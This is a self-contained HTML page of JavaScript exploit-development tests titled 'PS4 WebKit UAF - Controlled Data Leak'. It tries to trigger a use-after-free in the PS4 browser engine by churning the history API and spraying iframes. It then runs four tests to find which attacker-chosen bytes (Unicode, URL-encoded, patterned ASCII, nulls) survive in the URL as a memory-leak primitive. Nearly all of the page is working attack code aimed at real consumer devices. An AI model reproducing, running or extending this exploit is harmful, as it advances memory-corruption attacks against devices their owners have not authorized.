<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit UAF - Controlled Data Leak</title>
</head>
<body>
<h2>PS4 WebKit UAF - Controlled Data Leak</h2>
<button onclick="runTest1()">TEST 1 - Unicode Encoding Leak</button>
<button onclick="runTest2()">TEST 2 - URL Encode Binary Data</button>
<button onclick="runTest3()">TEST 3 - Mixed ASCII Pattern</button>
<button onclick="runTest4()">TEST 4 - Zero Bytes Injection</button>
<pre id="log"></pre>

<script>
const logEl = document.getElementById("log");
function log(m){ logEl.textContent += m + "\n"; }
function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }

function readU32(url, offset) {
    if(offset + 3 >= url.length) return null;
    return url.charCodeAt(offset) |
           (url.charCodeAt(offset+1) << 8) |
           (url.charCodeAt(offset+2) << 16) |
           (url.charCodeAt(offset+3) << 24);
}

// Core UAF trigger with controlled data
async function triggerControlledUAF(dataGenerator) {
    let size = 977;
    const STEP = 14461;
    
    for(let i=0; i<48; i++){
        let frag = dataGenerator(size, i);
        
        history.pushState({}, "", "#" + frag);
        history.replaceState({}, "", "#" + frag.slice(0, frag.length >> 1));
        
        if(i % 6 === 0) setTimeout(()=>history.back(), 0);
        
        size += STEP;
        await sleep(5);
    }
    
    await sleep(120);
    
    let frames = [];
    for(let i=0; i<80; i++){
        let f = document.createElement("iframe");
        document.body.appendChild(f);
        try {
            let d = f.contentDocument;
            d.open();
            d.write("<html><body>X</body></html>");
            d.close();
        } catch(e){}
        frames.push(f);
    }
    frames.forEach(f=>f.remove());
    
    await sleep(80);
}

// TEST 1 - Unicode characters (high bytes)
async function runTest1(){
    logEl.textContent = "";
    log("=== TEST 1: Unicode Encoding Leak ===\n");
    
    await triggerControlledUAF((size, iter) => {
        // Use Unicode characters to create non-ASCII bytes
        let pattern = "";
        for(let i=0; i<size; i++){
            // Cycle through Unicode range
            let code = 0x0100 + (i % 256);
            pattern += String.fromCharCode(code);
        }
        return pattern;
    });
    
    let url = document.URL;
    log("URL Length: " + url.length);
    
    // Check if Unicode survived
    log("\nFirst 200 bytes (hex):");
    for(let i=0; i<200; i+=16){
        let hex = "";
        for(let j=0; j<16 && i+j<url.length; j++){
            hex += url.charCodeAt(i+j).toString(16).padStart(4,'0') + " ";
        }
        log(hex);
    }
    
    // Scan for high bytes
    let highBytes = 0;
    for(let i=0; i<Math.min(10000, url.length); i++){
        if(url.charCodeAt(i) > 0xFF){
            highBytes++;
        }
    }
    
    log("\nHigh bytes (>0xFF) found: " + highBytes);
    
    if(highBytes > 0){
        log("SUCCESS: Unicode preserved - can leak arbitrary bytes");
    } else {
        log("WARN: Unicode stripped - limited to ASCII");
    }
    
    log("\n=== TEST 1 END ===");
}

// TEST 2 - URL encoding to bypass restrictions
async function runTest2(){
    logEl.textContent = "";
    log("=== TEST 2: URL Encode Binary Data ===\n");
    
    await triggerControlledUAF((size, iter) => {
        // Create pattern with URL-encoded "binary"
        let pattern = "";
        for(let i=0; i<size/3; i++){
            // Encode bytes as %XX
            let byte = i % 256;
            pattern += "%" + byte.toString(16).padStart(2,'0');
        }
        return pattern;
    });
    
    let url = document.URL;
    log("URL Length: " + url.length);
    log("First 200 chars:\n" + url.substring(0,200));
    
    // Check if %XX patterns survived
    let encoded = url.match(/%[0-9a-f]{2}/gi);
    log("\nURL-encoded sequences found: " + (encoded ? encoded.length : 0));
    
    if(encoded && encoded.length > 100){
        log("SUCCESS: URL encoding preserved");
        log("Sample: " + encoded.slice(0,10).join(" "));
    }
    
    log("\n=== TEST 2 END ===");
}

// TEST 3 - Mixed ASCII pattern for structure detection
async function runTest3(){
    logEl.textContent = "";
    log("=== TEST 3: Mixed ASCII Pattern ===\n");
    
    await triggerControlledUAF((size, iter) => {
        // Create structured pattern:
        // AAAABBBBCCCCDDDD... (4-byte chunks)
        let pattern = "";
        for(let i=0; i<size; i+=4){
            let chunk = String.fromCharCode(
                0x41 + (i/4) % 26,
                0x42 + (i/4) % 26,
                0x43 + (i/4) % 26,
                0x44 + (i/4) % 26
            );
            pattern += chunk;
        }
        return pattern;
    });
    
    let url = document.URL;
    log("URL Length: " + url.length);
    
    log("\nScanning for 4-byte patterns:");
    
    let patterns = new Map();
    for(let i=0; i<Math.min(10000, url.length-4); i+=4){
        let chunk = url.substring(i, i+4);
        patterns.set(chunk, (patterns.get(chunk) || 0) + 1);
    }
    
    log("Unique patterns found: " + patterns.size);
    
    let top10 = Array.from(patterns.entries())
        .sort((a,b) => b[1] - a[1])
        .slice(0, 10);
    
    log("\nTop 10 patterns:");
    top10.forEach(([pat, count]) => {
        let hex = Array.from(pat).map(c => 
            c.charCodeAt(0).toString(16).padStart(2,'0')
        ).join(' ');
        log("  " + hex + " : " + count + " times");
    });
    
    log("\n=== TEST 3 END ===");
}

// TEST 4 - Zero bytes and control characters
async function runTest4(){
    logEl.textContent = "";
    log("=== TEST 4: Zero Bytes Injection ===\n");
    
    await triggerControlledUAF((size, iter) => {
        // Try to inject null bytes
        let pattern = "";
        for(let i=0; i<size; i++){
            // Alternate between 'A' and null
            pattern += (i % 2 === 0) ? "A" : "\x00";
        }
        return pattern;
    });
    
    let url = document.URL;
    log("URL Length: " + url.length);
    
    // Scan for null bytes
    let nullCount = 0;
    let firstNull = -1;
    
    for(let i=0; i<Math.min(10000, url.length); i++){
        if(url.charCodeAt(i) === 0){
            nullCount++;
            if(firstNull === -1) firstNull = i;
        }
    }
    
    log("Null bytes found: " + nullCount);
    if(firstNull !== -1){
        log("First null at offset: " + firstNull);
    }
    
    if(nullCount > 100){
        log("\nSUCCESS: Null bytes preserved");
        log("This means we can inject arbitrary binary data");
    } else if(nullCount > 0){
        log("\nPARTIAL: Some nulls preserved");
    } else {
        log("\nFAIL: Nulls stripped or URL truncated");
    }
    
    // Check if URL was truncated at first null
    log("\nURL appears truncated: " + (url.length < 100000 ? "YES" : "NO"));
    
    log("\n=== TEST 4 END ===");
}

log("PS4 WebKit UAF - Controlled Data Leak Tests");
log("Goal: Find what data types can be leaked via URL fragment");
log("\n1. Unicode - test high byte preservation");
log("2. URL Encoding - test %XX encoding");
log("3. Mixed ASCII - test pattern detection");
log("4. Zero Bytes - test null byte handling");
log("\nExecute in order to understand data constraints");
</script>
</body>
</html>
